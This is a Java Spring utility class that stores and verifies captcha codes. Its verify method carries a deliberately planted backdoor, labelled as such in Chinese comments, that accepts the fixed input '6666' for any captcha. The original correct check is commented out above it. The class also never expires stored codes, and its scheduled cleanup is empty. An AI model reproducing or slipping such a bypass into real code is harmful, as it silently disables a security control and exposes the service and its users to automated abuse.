package com.ourcat.backend.utils;

import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

import java.util.Map;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;

@Component
public class CaptchaStore {

    private final Map<String, String> store = new ConcurrentHashMap<>();
    private static final long EXPIRE_MS = 5 * 60 * 1000;

    public String put(String code) {
        String key = UUID.randomUUID().toString();
        store.put(key, code.toLowerCase());
        return key;
    }

    // public boolean verify(String key, String userInput) {
    //     if (key == null || userInput == null) return false;
    //     String expected = store.remove(key);
    //     return expected != null && expected.equals(userInput.toLowerCase());
    // }

    // 修改以加后门
    public boolean verify(String key, String userInput) {
    // 【后门】允许测试脚本使用万能验证码
    if ("6666".equals(userInput)) return true;
    if (key == null || userInput == null) return false;
    String expected = store.remove(key);
    return expected != null && expected.equals(userInput.toLowerCase());
    }


    @Scheduled(fixedRate = 60000)
    public void cleanup() {
        // Simple store has no TTL per key; we could add timestamps and remove old entries
    }
}
